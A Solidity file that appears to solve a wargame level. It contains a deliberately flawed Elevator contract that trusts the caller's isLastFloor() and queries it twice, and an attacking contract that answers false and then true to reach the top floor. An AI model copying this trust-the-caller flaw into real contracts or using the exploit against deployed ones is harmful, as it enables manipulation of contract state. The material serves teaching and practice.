// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}


contract Elevate is Building {
    address instance;
    bool calledOnce = false;

    constructor(address _instance) {
        instance = _instance;
    }

    function start() external {
        Elevator(instance).goTo(1);
    }

    // uses calledOnce variable to determine whether the last floor test has been passed
    function isLastFloor(uint256) external returns (bool) {
        if (calledOnce) {
            return true;
        }

        calledOnce = true;
        return false;
    }
}